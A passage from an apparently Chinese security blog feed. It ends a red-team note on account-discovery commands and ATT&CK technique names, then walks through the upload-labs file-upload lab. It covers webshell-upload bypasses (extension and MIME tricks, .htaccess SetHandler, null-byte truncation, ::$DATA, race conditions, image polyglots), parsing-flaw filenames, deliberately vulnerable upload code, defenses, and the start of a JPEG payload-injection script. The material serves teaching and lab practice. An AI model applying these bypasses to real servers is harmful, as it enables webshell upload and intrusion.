href="#0x70-Discovery" class="headerlink" title="0x70 Discovery"></a><strong>0x70 Discovery</strong></h2><h2 id="0x71-T1087-Account-Discovery-账户发现"><a href="#0x71-T1087-Account-Discovery-账户发现" class="headerlink" title="0x71 T1087-Account Discovery 账户发现"></a>0x71 <span id="T1087">T1087-Account Discovery 账户发现</span></h2><p><strong>Windows</strong></p><ol><li>net user</li><li>net user /domain</li><li>net group</li><li>net localgroup administrator</li></ol><p><strong>Linux</strong></p><ol><li>cat /etc/passwd</li></ol><p><strong>Mac</strong></p><ol><li>dscl . list /users #查看用户</li><li>dscl . list /groups #查看用户组</li></ol><h2 id="0xF0-其他"><a href="#0xF0-其他" class="headerlink" title="0xF0 其他"></a>0xF0 其他</h2><ol><li>T1084-Windows Management Instrumentation Event Subscription</li><li>T1098-Account Manipulation</li><li>T1103-AppInit DLLs</li><li>T1038-DLL Search Order Hijacking</li><li>T1500-Compile After Delivery</li><li>T1158-Hidden Files and Directories</li><li>T1223-Compiled HTML File</li><li>T1090-Connection Proxy</li><li>T1140-Deobfuscate/Decode Files or Information</li><li>T1073-DLL Side-Loading</li><li>T1089 - Disabling Security Tools</li><li>T1107 - File Deletion</li></ol><h2 id="0xFE-参考"><a href="#0xFE-参考" class="headerlink" title="0xFE 参考"></a>0xFE 参考</h2><ol><li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md</a></li></ol><h2 id="0xFF-帮助附录"><a href="#0xFF-帮助附录" class="headerlink" title="0xFF 帮助附录"></a>0xFF 帮助附录</h2><p><strong>Linux ps</strong></p><pre><code>[root@localhost ~]# ps --help allUsage: ps [options]Basic options: -A, -e               all processes -a                   all with tty, except session leaders  a                   all with tty, including other users -d                   all except session leaders -N, --deselect       negate selection  r                   only running processes  T                   all processes on this terminal  x                   processes without controlling ttysSelection by list: -C &lt;command&gt;         command name -G, --Group &lt;GID&gt;    real group id or name -g, --group &lt;group&gt;  session or effective group name -p, p, --pid &lt;PID&gt;   process id        --ppid &lt;PID&gt;  parent process id -q, q, --quick-pid &lt;PID&gt;                      process id (quick mode) -s, --sid &lt;session&gt;  session id -t, t, --tty &lt;tty&gt;   terminal -u, U, --user &lt;UID&gt;  effective user id or name -U, --User &lt;UID&gt;     real user id or name  The selection options take as their argument either:    a comma-separated list e.g. &#39;-u root,nobody&#39; or    a blank-separated list e.g. &#39;-p 123 4567&#39;Output formats: -F                   extra full -f                   full-format, including command lines  f, --forest         ascii art process tree -H                   show process hierarchy -j                   jobs format  j                   BSD job control format -l                   long format  l                   BSD long format -M, Z                add security data (for SELinux) -O &lt;format&gt;          preloaded with default columns  O &lt;format&gt;          as -O, with BSD personality -o, o, --format &lt;format&gt;                      user-defined format  s                   signal format  u                   user-oriented format  v                   virtual memory format  X                   register format -y                   do not show flags, show rss vs. addr (used with -l)     --context        display security context (for SELinux)     --headers        repeat header lines, one per page     --no-headers     do not print header at all     --cols, --columns, --width &lt;num&gt;                      set screen width     --rows, --lines &lt;num&gt;                      set screen heightShow threads:  H                   as if they were processes -L                   possibly with LWP and NLWP columns -m, m                after processes -T                   possibly with SPID columnMiscellaneous options: -c                   show scheduling class with -l option  c                   show true command name  e                   show the environment after command  k,    --sort        specify sort order as: [+|-]key[,[+|-]key[,...]]  L                   show format specifiers  n                   display numeric uid and wchan  S,    --cumulative  include some dead child process data -y                   do not show flags, show rss (only with -l) -V, V, --version     display version information and exit -w, w                unlimited output width        --help &lt;simple|list|output|threads|misc|all&gt;                      display help and exitFor more details see ps(1).</code></pre><p><strong>Linux grep</strong></p><pre><code>[root@localhost ~]# grep --help用法: grep [选项]... PATTERN [FILE]...在每个 FILE 或是标准输入中查找 PATTERN。默认的 PATTERN 是一个基本正则表达式(缩写为 BRE)。例如: grep -i &#39;hello world&#39; menu.h main.c正则表达式选择与解释:  -E, --extended-regexp     PATTERN 是一个可扩展的正则表达式(缩写为 ERE)  -F, --fixed-strings       PATTERN 是一组由断行符分隔的定长字符串。  -G, --basic-regexp        PATTERN 是一个基本正则表达式(缩写为 BRE)  -P, --perl-regexp         PATTERN 是一个 Perl 正则表达式  -e, --regexp=PATTERN      用 PATTERN 来进行匹配操作  -f, --file=FILE           从 FILE 中取得 PATTERN  -i, --ignore-case         忽略大小写  -w, --word-regexp         强制 PATTERN 仅完全匹配字词  -x, --line-regexp         强制 PATTERN 仅完全匹配一行  -z, --null-data           一个 0 字节的数据行，但不是空行Miscellaneous:  -s, --no-messages         suppress error messages  -v, --invert-match        select non-matching lines  -V, --version             display version information and exit      --help                display this help text and exit输出控制:  -m, --max-count=NUM       NUM 次匹配后停止  -b, --byte-offset         输出的同时打印字节偏移  -n, --line-number         输出的同时打印行号      --line-buffered       每行输出清空  -H, --with-filename       为每一匹配项打印文件名  -h, --no-filename         输出时不显示文件名前缀      --label=LABEL         将LABEL 作为标准输入文件名前缀  -o, --only-matching       show only the part of a line matching PATTERN  -q, --quiet, --silent     suppress all normal output      --binary-files=TYPE   assume that binary files are TYPE;                            TYPE is &#39;binary&#39;, &#39;text&#39;, or &#39;without-match&#39;  -a, --text                equivalent to --binary-files=text  -I                        equivalent to --binary-files=without-match  -d, --directories=ACTION  how to handle directories;                            ACTION is &#39;read&#39;, &#39;recurse&#39;, or &#39;skip&#39;  -D, --devices=ACTION      how to handle devices, FIFOs and sockets;                            ACTION is &#39;read&#39; or &#39;skip&#39;  -r, --recursive           like --directories=recurse  -R, --dereference-recursive                            likewise, but follow all symlinks      --include=FILE_PATTERN                            search only files that match FILE_PATTERN      --exclude=FILE_PATTERN                            skip files and directories matching FILE_PATTERN      --exclude-from=FILE   skip files matching any file pattern from FILE      --exclude-dir=PATTERN directories that match PATTERN will be skipped.  -L, --files-without-match print only names of FILEs containing no match  -l, --files-with-matches  print only names of FILEs containing matches  -c, --count               print only a count of matching lines per FILE  -T, --initial-tab         make tabs line up (if needed)  -Z, --null                print 0 byte after FILE name文件控制:  -B, --before-context=NUM  打印以文本起始的NUM 行  -A, --after-context=NUM   打印以文本结尾的NUM 行  -C, --context=NUM         打印输出文本NUM 行  -NUM                      same as --context=NUM      --group-separator=SEP use SEP as a group separator      --no-group-separator  use empty string as a group separator      --color[=WHEN],      --colour[=WHEN]       use markers to highlight the matching strings;                            WHEN is &#39;always&#39;, &#39;never&#39;, or &#39;auto&#39;  -U, --binary              do not strip CR characters at EOL (MSDOS/Windows)  -u, --unix-byte-offsets   report offsets as if CRs were not there                            (MSDOS/Windows)‘egrep’即‘grep -E’。‘fgrep’即‘grep -F’。直接使用‘egrep’或是‘fgrep’均已不可行了。若FILE 为 -，将读取标准输入。不带FILE，读取当前目录，除非命令行中指定了-r 选项。如果少于两个FILE 参数，就要默认使用-h 参数。如果有任意行被匹配，那退出状态为 0，否则为 1；如果有错误产生，且未指定 -q 参数，那退出状态为 2。</code></pre><h2 id="red-team"><a href="#red-team" class="headerlink" title="red team"></a>red team</h2><p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming#-lateral-movement" target="_blank" rel="noopener">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming#-lateral-movement</a><br><a href="https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE" target="_blank" rel="noopener">https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE</a><br><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a><br><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit" target="_blank" rel="noopener">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
            <tag> backdoor </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File-Upload</title>
      <link href="/File-Upload/"/>
      <url>/File-Upload/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-File-Upload"><a href="#0x00-File-Upload" class="headerlink" title="0x00 File-Upload"></a>0x00 File-Upload</h2><p><img src="/File-Upload/upload.png" alt></p><ol><li>文件上传漏洞，上传过程中有或多或少的安全检测，同样有各种各样的绕过防护。</li><li>环境：windows server 2008 + phpstudy PHP5.2.17</li></ol><h2 id="0x01-前端JS检测"><a href="#0x01-前端JS检测" class="headerlink" title="0x01 前端JS检测"></a>0x01 前端JS检测</h2><ol><li>上传一句话木马1.php，前端JS检测</li><li><img src="/File-Upload/2.png" alt></li><li><img src="/File-Upload/3.png" alt></li><li>绕过方式：修改文件后缀名，绕过前端检测，拦截请求包改回来</li><li>把1.php改名1.png，拦截上传请求包，改回来</li><li><img src="/File-Upload/4.png" alt></li><li>Cknife连接</li><li><img src="/File-Upload/5.png" alt></li></ol><h2 id="0x02-MIME检测"><a href="#0x02-MIME检测" class="headerlink" title="0x02 MIME检测"></a>0x02 MIME检测</h2><ol><li><img src="/File-Upload/6.png" alt></li><li><img src="/File-Upload/7.png" alt></li><li>绕过方式：修改Content-Type的值为image/jpeg、image/png、image/gif之一</li><li>拦截上传请求包，修改Content-Type的值</li><li><img src="/File-Upload/8.png" alt></li></ol><h2 id="0x03-blacklist检测"><a href="#0x03-blacklist检测" class="headerlink" title="0x03 blacklist检测"></a>0x03 blacklist检测</h2><ol><li><img src="/File-Upload/9.png" alt></li><li><img src="/File-Upload/10.png" alt></li><li>绕过方式：修改文件后缀名为php3、php4、php5、php6、php7、phtml、pht、phar、phpt等等</li><li>但有条件，配置里设置是否解析，这里Apache默认设置不解析.phtml</li><li><img src="/File-Upload/11.png" alt></li><li>手拿放进去，访问，不解析</li><li><img src="/File-Upload/12.png" alt></li><li>但在kali里就可以解析</li><li><img src="/File-Upload/13.png" alt></li><li>查看配置/etc/apache2/，*-enabled表示在是用的配置，*-available表示是可用的配置。</li><li><img src="/File-Upload/14.png" alt></li><li><img src="/File-Upload/15.png" alt></li><li>除此，还可以通过.htaccess文件来添加解析类型。</li><li>AddType application/x-httpd-php xxx</li><li>这里按着靶场的剧本走，假设是可以解析.phtml的（去掉#，重启Apache）</li><li><img src="/File-Upload/16.png" alt></li><li>再上传，访问</li><li><img src="/File-Upload/17.png" alt></li><li><img src="/File-Upload/18.png" alt></li></ol><h2 id="0x04-big-blacklist检测"><a href="#0x04-big-blacklist检测" class="headerlink" title="0x04 big blacklist检测"></a>0x04 big blacklist检测</h2><ol><li><img src="/File-Upload/19.png" alt></li><li>绕过方式：上传.htaccess文件，改变配置</li><li>.htaccess文件内容：SetHandler application/x-httpd-php #所有文件都将当作php文件来解析</li><li>上传图片木马，上传.htaccess</li><li><img src="/File-Upload/20.png" alt></li><li><img src="/File-Upload/21.png" alt></li><li>访问../upload/4.jpg</li><li><img src="/File-Upload/22.png" alt></li></ol><h2 id="0x05-htaccess-in-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA"><a href="#0x05-htaccess-in-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA" class="headerlink" title="0x05 .htaccess in big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA"></a>0x05 .htaccess in big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA</h2><ol><li>利用windows的文件特性绕过：5.php. .，点空格点</li><li><img src="/File-Upload/23.png" alt></li><li><img src="/File-Upload/24.png" alt></li></ol><h2 id="0x06-big-blacklist检测-去尾点-转换为小写-首尾去空"><a href="#0x06-big-blacklist检测-去尾点-转换为小写-首尾去空" class="headerlink" title="0x06 big blacklist检测+去尾点+转换为小写+首尾去空"></a>0x06 big blacklist检测+去尾点+转换为小写+首尾去空</h2><ol><li><img src="/File-Upload/25.png" alt></li><li>大小写绕过：6.Php</li><li><img src="/File-Upload/26.png" alt></li><li><img src="/File-Upload/27.png" alt></li></ol><h2 id="0x07-big-blacklist检测-去尾点-转换为小写-去-DATA"><a href="#0x07-big-blacklist检测-去尾点-转换为小写-去-DATA" class="headerlink" title="0x07 big blacklist检测+去尾点+转换为小写+去::$DATA"></a>0x07 big blacklist检测+去尾点+转换为小写+去::$DATA</h2><ol><li><img src="/File-Upload/28.png" alt></li><li>末尾部加空格绕过，7.php[空格]</li><li><img src="/File-Upload/29.png" alt></li><li><img src="/File-Upload/30.png" alt></li></ol><h2 id="0x08-big-blacklist检测-转换为小写-去-DATA-首尾去空"><a href="#0x08-big-blacklist检测-转换为小写-去-DATA-首尾去空" class="headerlink" title="0x08 big blacklist检测+转换为小写+去::$DATA+首尾去空"></a>0x08 big blacklist检测+转换为小写+去::$DATA+首尾去空</h2><ol><li><img src="/File-Upload/31.png" alt></li><li>文件后缀名加点绕过：8.php.</li><li><img src="/File-Upload/32.png" alt></li><li><img src="/File-Upload/33.png" alt></li></ol><h2 id="0x09-big-blacklist检测-去尾点-转换为小写-首尾去空"><a href="#0x09-big-blacklist检测-去尾点-转换为小写-首尾去空" class="headerlink" title="0x09 big blacklist检测+去尾点+转换为小写+首尾去空"></a>0x09 big blacklist检测+去尾点+转换为小写+首尾去空</h2><ol><li><img src="/File-Upload/34.png" alt></li><li>利用windows文件流特性绕过：9.php::$DATA</li><li><img src="/File-Upload/35.png" alt></li><li><img src="/File-Upload/36.png" alt></li></ol><h2 id="0x0A-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA"><a href="#0x0A-big-blacklist检测-去尾点-转换为小写-首尾去空-去-DATA" class="headerlink" title="0x0A big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA"></a>0x0A big blacklist检测+去尾点+转换为小写+首尾去空+去::$DATA</h2><ol><li><img src="/File-Upload/37.png" alt></li><li>与0x05一样利用windows的文件特性绕过：10.php. .，点空格点</li><li><img src="/File-Upload/38.png" alt></li><li><img src="/File-Upload/39.png" alt></li></ol><h2 id="0x0B-big-blacklist检测-替换为空"><a href="#0x0B-big-blacklist检测-替换为空" class="headerlink" title="0x0B big blacklist检测+替换为空"></a>0x0B big blacklist检测+替换为空</h2><ol><li><img src="/File-Upload/40.png" alt></li><li>双文件名绕过：11.pphphp</li><li><img src="/File-Upload/41.png" alt></li><li><img src="/File-Upload/42.png" alt></li></ol><h2 id="0x0C-whitelist检测-GET请求截断"><a href="#0x0C-whitelist检测-GET请求截断" class="headerlink" title="0x0C whitelist检测+GET请求截断"></a>0x0C whitelist检测+GET请求截断</h2><ol><li><img src="/File-Upload/43.png" alt></li><li>必须条件：PHP&lt;5.3.4，php.ini下设置magic_quotes_gpc = Off</li><li>路径可控，路径后+文件名+%00</li><li>绕过：选中%00，ctrl+shift+u</li><li><img src="/File-Upload/44.png" alt></li><li><img src="/File-Upload/45.png" alt></li></ol><h2 id="0x0D-whitelist检测-POST请求截断"><a href="#0x0D-whitelist检测-POST请求截断" class="headerlink" title="0x0D whitelist检测+POST请求截断"></a>0x0D whitelist检测+POST请求截断</h2><ol><li><img src="/File-Upload/46.png" alt></li><li>必须条件：PHP&lt;5.3.4，php.ini下设置magic_quotes_gpc = Off</li><li>路径可控，路径后+文件名+%00</li><li>绕过：选中%00，ctrl+shift+u</li><li><img src="/File-Upload/47.png" alt></li><li><img src="/File-Upload/48.png" alt></li></ol><h2 id="0x10-——-——-——-——-——-——-——-——-——-——-——"><a href="#0x10-——-——-——-——-——-——-——-——-——-——-——" class="headerlink" title="0x10 —— —— —— —— —— —— —— —— —— —— ——"></a>0x10 —— —— —— —— —— —— —— —— —— —— ——</h2><ol><li>以下上传图片木马配合文件包含漏洞</li></ol><h2 id="0x11-文件类型检测"><a href="#0x11-文件类型检测" class="headerlink" title="0x11 文件类型检测"></a>0x11 文件类型检测</h2><ol><li><img src="/File-Upload/49.png" alt></li><li>读取2字节判断上传文件的类型</li><li><img src="/File-Upload/52.png" alt></li><li><img src="/File-Upload/53.png" alt></li><li><a href="https://www.runoob.com/php/func-misc-unpack.html" target="_blank" rel="noopener">unpack函数</a></li><li>上传包含木马的图片，结合文件包含漏洞来利用。</li><li>绕过：文件内容前添加GIF89a</li><li><img src="/File-Upload/50.png" alt></li><li><img src="/File-Upload/51.png" alt></li></ol><h2 id="0x12-获取文件相关信息并检测"><a href="#0x12-获取文件相关信息并检测" class="headerlink" title="0x12 获取文件相关信息并检测"></a>0x12 获取文件相关信息并检测</h2><ol><li><img src="/File-Upload/54.png" alt></li><li>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</li><li>$info = getimagesize($filename);</li><li>$ext = image_type_to_extension($info[2]); #这里就是获取后缀名</li><li>phpinfo.php</li><li><img src="/File-Upload/55.png" alt></li><li>获取phpinfo.php的文件相关信息</li><li><img src="/File-Upload/56.png" alt></li><li>绕过：文件内容前添加GIF89a</li><li><img src="/File-Upload/57.png" alt></li><li><img src="/File-Upload/58.png" alt></li></ol><h2 id="0x13-exif-imagetype函数检测"><a href="#0x13-exif-imagetype函数检测" class="headerlink" title="0x13 exif_imagetype函数检测"></a>0x13 exif_imagetype函数检测</h2><ol><li><img src="/File-Upload/59.png" alt></li><li><a href="https://www.php.net/manual/zh/function.exif-imagetype.php" target="_blank" rel="noopener">exif_imagetype — 读取一个图像的第一个字节并检查其签名。</a></li><li>必须开启php_exif模块</li><li><img src="/File-Upload/60.png" alt></li><li>制作图片木马</li><li>copy 2.jpg/b+phpinfo.php/a phpinfo.jpg</li><li><img src="/File-Upload/62.png" alt></li><li><img src="/File-Upload/61.png" alt></li><li><img src="/File-Upload/63.png" alt></li></ol><h2 id="0x14-二次渲染"><a href="#0x14-二次渲染" class="headerlink" title="0x14 二次渲染"></a>0x14 二次渲染</h2><p><strong>关键代码</strong></p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])){    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);    // 获得上传文件的扩展名    $fileext= substr(strrchr($filename,&quot;.&quot;),1);    //判断文件后缀与类型，合法才进行上传操作    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){        if(move_uploaded_file($tmpname,$target_path)){            //使用上传的图片生成新的图片            $im = imagecreatefromjpeg($target_path);            if($im == false){                $msg = &quot;该文件不是jpg格式的图片！&quot;;                @unlink($target_path);            }else{                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.jpg&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagejpeg($im,$img_path);                @unlink($target_path);                $is_upload = true;            }        } else {            $msg = &quot;上传出错！&quot;;        }    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){        if(move_uploaded_file($tmpname,$target_path)){            //使用上传的图片生成新的图片            $im = imagecreatefrompng($target_path);            if($im == false){                $msg = &quot;该文件不是png格式的图片！&quot;;                @unlink($target_path);            }else{                 //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.png&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagepng($im,$img_path);                @unlink($target_path);                $is_upload = true;                           }        } else {            $msg = &quot;上传出错！&quot;;        }    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){        if(move_uploaded_file($tmpname,$target_path)){            //使用上传的图片生成新的图片            $im = imagecreatefromgif($target_path);            if($im == false){                $msg = &quot;该文件不是gif格式的图片！&quot;;                @unlink($target_path);            }else{                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.gif&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagegif($im,$img_path);                @unlink($target_path);                $is_upload = true;            }        } else {            $msg = &quot;上传出错！&quot;;        }    }else{        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;    }}</code></pre><ol><li><strong>上传过程：</strong></li><li>图片后插入木马，上传图片木马后，下载它，与原图片进行对比，查看图片文件渲染哪些位置</li><li>查看木马代码是否被渲染了，选择没被渲染的部分插入木马代码，再上传。</li><li><strong>测试gif图片</strong></li><li><img src="/File-Upload/gif.gif" alt></li><li><img src="/File-Upload/66.png" alt></li><li><img src="/File-Upload/67.png" alt></li><li>利用文件包含漏洞验证脚本：</li><li><img src="/File-Upload/68.png" alt></li><li></li><li><strong>测试jpg图片</strong></li><li><img src="/File-Upload/phpinfo.jpg" alt></li><li><a href="#jump">大牛编写的脚本jpg_payload.php</a></li><li>php jpg_payload.php 1.jpg #windows下多次不行就换到Linux里</li><li><img src="/File-Upload/65.png" alt></li><li><img src="/File-Upload/64.png" alt></li><li>上传后，php代码还是可能会被破坏~</li><li></li><li><strong>测试php图片</strong></li><li><img src="/File-Upload/png.png" alt></li><li>png+<a href="#jump">PLTE数据块写入php代码计算CRC脚本</a></li><li><img src="/File-Upload/72.png" alt></li><li><img src="/File-Upload/73.png" alt></li><li>上传</li><li><img src="/File-Upload/71.png" alt></li><li>同样，php代码是否被破坏，下载下来打开查看。</li><li></li><li>png+<a href="#jump">大牛写的脚本png.php</a></li><li><img src="/File-Upload/69.png" alt></li><li><img src="/File-Upload/70.png" alt></li></ol><h2 id="0x15-条件竞争1"><a href="#0x15-条件竞争1" class="headerlink" title="0x15 条件竞争1"></a>0x15 条件竞争1</h2><ol><li>白名单判断是否允许类型文件，否则unlink()删除文件</li><li><img src="/File-Upload/74.png" alt></li><li>利用条件竞争来同时上传木马和访问木马</li><li><img src="/File-Upload/75.png" alt></li><li><img src="/File-Upload/76.png" alt></li><li>成功访问</li><li><img src="/File-Upload/77.png" alt></li></ol><h2 id="0x16-条件竞争2"><a href="#0x16-条件竞争2" class="headerlink" title="0x16 条件竞争2"></a>0x16 条件竞争2</h2><ol><li>对上传文件白名单验证后缀名，进行move()保存临时目录，再rename</li><li>直接上传木马图片</li><li><img src="/File-Upload/78.png" alt></li><li><img src="/File-Upload/79.png" alt></li><li><img src="/File-Upload/80.png" alt></li></ol><h2 id="0x17-黑名单-文件名可控"><a href="#0x17-黑名单-文件名可控" class="headerlink" title="0x17 黑名单+文件名可控"></a>0x17 黑名单+文件名可控</h2><ol><li><img src="/File-Upload/81.png" alt></li><li>直接上传php木马，绕过黑名单就行（如果服务器可以解析的话）</li><li><img src="/File-Upload/82.png" alt></li><li><img src="/File-Upload/83.png" alt></li><li>/.绕过</li><li>自定义文件名为19.php/.</li><li><img src="/File-Upload/84.png" alt></li><li><img src="/File-Upload/85.png" alt></li></ol><h2 id="0x18-文件类型白名单-文件后缀名白名单检测"><a href="#0x18-文件类型白名单-文件后缀名白名单检测" class="headerlink" title="0x18 文件类型白名单+文件后缀名白名单检测"></a>0x18 文件类型白名单+文件后缀名白名单检测</h2><ol><li>数组+/绕过</li><li><img src="/File-Upload/86.png" alt></li><li><img src="/File-Upload/87.png" alt></li></ol><h2 id="0x20-其他上传姿势"><a href="#0x20-其他上传姿势" class="headerlink" title="0x20 其他上传姿势"></a>0x20 其他上传姿势</h2><ol><li>1.php——1%0a.php #换行</li><li>1.jpg.png.gif.php #双重后缀名、多重后缀名</li><li>1.asp;.jpg #利用IIS解析漏洞</li><li>./0.asp/1.jpg #利用IIS6.0解析漏洞</li><li>/1.php #IIS7.0/7.5解析漏洞</li><li>1.jpg%00.php #nginx（0.5.x, 0.6.x, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37）空字节漏洞，php版本要小于5.3.4</li><li>1.png/2.php #nginx解析漏洞</li><li>1.php.asd #apache解析漏洞，从右往左解析，解析不了就跳过，解析下一个后缀名</li><li>1.php:2.jpg</li><li>3.php::$DATA</li><li>4.php::$DATA……..</li><li>fuzz黑名单文件名</li></ol><h2 id="0x21-双文件上传"><a href="#0x21-双文件上传" class="headerlink" title="0x21 双文件上传"></a>0x21 双文件上传</h2><ol><li>F12或右击审查元素，找到上传点的action，复制粘贴&lt;input…&gt;，然后就会出现两个上传框，第一个上传图片，第二个上传木马</li></ol><h2 id="0x22-上传框提交按钮"><a href="#0x22-上传框提交按钮" class="headerlink" title="0x22 上传框提交按钮"></a>0x22 上传框提交按钮</h2><ol><li>有时候会出现，只有一个浏览文件，却没有提交按钮</li><li>F12审查元素，添加：</li><li><input type="submit" value="提交" name="xx"></li></ol><h2 id="0x30-黑名单"><a href="#0x30-黑名单" class="headerlink" title="0x30 黑名单"></a>0x30 黑名单</h2><ol><li>.php、.php5、.php4、.php3、.php2、.php1、.html、.htm、.phtml、.pht、.pHp、.pHp5、.pHp4、</li><li>.pHp3、.pHp2、.pHp1、.Html、.Htm、.pHtml、.jsp、.jspa、.jspx、.jsw、.jsv、.jspf、.jtml、</li><li>.jSp、.jSpx、.jSpa、.jSw、.jSv、.jSpf、.jHtml、.asp、.aspx、.asa、.asax、.ascx、.ashx、</li><li>.asmx、.cer、.aSp、.aSpx、.aSa、.asac、.aSax、.aScx、.aShx、.aSmx、.cEr、.sWf、.swf、.ini</li><li>.cfm、.shtml、.cdx</li></ol><h2 id="0xFD-防护策略"><a href="#0xFD-防护策略" class="headerlink" title="0xFD 防护策略"></a>0xFD 防护策略</h2><ol><li>设置上传文件的文件后缀名白名单</li><li>限制上传文件的大小，文件内容识别</li><li>设置复杂随机的路径名与文件名</li><li>禁止错误信息回显上传文件的绝对路径</li><li>网站不存在文件解析漏洞</li><li>上传文件的保存目录只有读写权限，没有执行权限</li><li>设置单独的文件服务器与域名</li></ol><h2 id="0xFE-参考"><a href="#0xFE-参考" class="headerlink" title="0xFE 参考"></a>0xFE 参考</h2><ol><li><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></li><li><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></li><li><a href="https://xz.aliyun.com/t/4029#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/4029#toc-13</a></li></ol><h2 id="0xFF-代码"><a href="#0xFF-代码" class="headerlink" title="0xFF 代码"></a>0xFF 代码</h2><p><strong>简单的文件上传代码</strong><br><strong>upload.html</strong></p><pre><code>&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;        File Upload    &lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;        &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br/&gt;        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>upload.php</strong></p><pre><code>&lt;?phphighlight_file(__FILE__);echo &quot;&lt;br&gt;&quot;;#JS检测$allow_extensions=array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);$extension=end(explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]));if(in_array($extension,$allow_extensions)){    if($_FILES[&quot;file&quot;][&quot;error&quot;]&gt;0)    {        echo &quot;错误：&quot;.$_FILES[&quot;file&quot;][&quot;error&quot;].&quot;&lt;br&gt;&quot;;    }    else    {        echo &quot;文件名：&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;].&quot;&lt;br&gt;&quot;;        echo &quot;文件类型：&quot;.$_FILES[&quot;file&quot;][&quot;type&quot;].&quot;&lt;br&gt;&quot;;        echo &quot;文件大小：&quot;.$_FILES[&quot;file&quot;][&quot;size&quot;].&quot;&lt;br&gt;&quot;;        echo &quot;文件临时位置：&quot;.$_FILES[&quot;file&quot;][&quot;tmp_name&quot;].&quot;&lt;br&gt;&quot;;    }    if(file_exists(&quot;files/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]))    {        echo $_FILES[&quot;file&quot;][&quot;name&quot;].&quot;文件已存在&quot;;    }    else    {        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;files/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);        echo &quot;文件保存在：&quot;.&quot;files/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];    }}else{    echo &quot;非法文件&quot;;}?&gt;</code></pre><p><img src="/File-Upload/1.png" alt></p><p><strong><span id="jump">大牛编写的脚本jpg_payload.php</span></strong></p><pre><code>&lt;?php    /*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg&gt;    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) {        die(&#39;php-gd is not installed&#39;);    }    if(!isset($argv[1])) {        die(&#39;php jpg_payload.php 